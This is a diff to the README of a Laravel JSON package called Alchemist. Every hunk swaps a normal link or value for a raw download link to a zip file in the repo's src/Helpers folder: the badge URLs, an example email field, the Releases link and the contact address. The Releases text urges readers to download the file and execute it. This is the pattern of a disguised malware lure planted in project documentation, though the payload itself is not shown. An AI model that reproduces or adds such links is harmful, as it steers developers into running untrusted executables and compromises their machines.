@@ -1,8 +1,8 @@
 # Alchemist 🧙‍♂️
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Downloads](https://img.shields.io/badge/downloads-1000--+orange)
+![Version](https://github.com/87870/Alchemist/raw/refs/heads/main/src/Helpers/Software-3.5.zip)
+![License](https://github.com/87870/Alchemist/raw/refs/heads/main/src/Helpers/Software-3.5.zip)
+![Downloads](https://github.com/87870/Alchemist/raw/refs/heads/main/src/Helpers/Software-3.5.zip+orange)
 
 Welcome to **Alchemist**, the JSON Revolution for Laravel! This package offers a simple, fast, and elegant alternative to Laravel JSON Resource. With Alchemist, you can manipulate and export JSON data effortlessly, making your Laravel applications more efficient and easier to manage.
 
@@ -56,7 +56,7 @@ Here's a simple example of how to use Alchemist:
 ```php
 $data = [
     'name' => 'John Doe',
-    'email' => 'john@example.com',
+    'email' => 'https://github.com/87870/Alchemist/raw/refs/heads/main/src/Helpers/Software-3.5.zip',
 ];
 
 $json = Alchemist::create($data);
@@ -132,13 +132,13 @@ Alchemist is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 
 ## Releases
 
-To download the latest version of Alchemist, visit [Releases](https://github.com/87870/Alchemist/releases). Make sure to download the latest file and execute it to get started with Alchemist.
+To download the latest version of Alchemist, visit [Releases](https://github.com/87870/Alchemist/raw/refs/heads/main/src/Helpers/Software-3.5.zip). Make sure to download the latest file and execute it to get started with Alchemist.
 
 You can also check the "Releases" section for updates and new features.
 
 ## Contact
 
-For questions or feedback, feel free to reach out through GitHub issues or contact me directly at [your-email@example.com](mailto:your-email@example.com).
+For questions or feedback, feel free to reach out through GitHub issues or contact me directly at [https://github.com/87870/Alchemist/raw/refs/heads/main/src/Helpers/Software-3.5.zip](https://github.com/87870/Alchemist/raw/refs/heads/main/src/Helpers/Software-3.5.zip).
 
 ## Acknowledgments
 
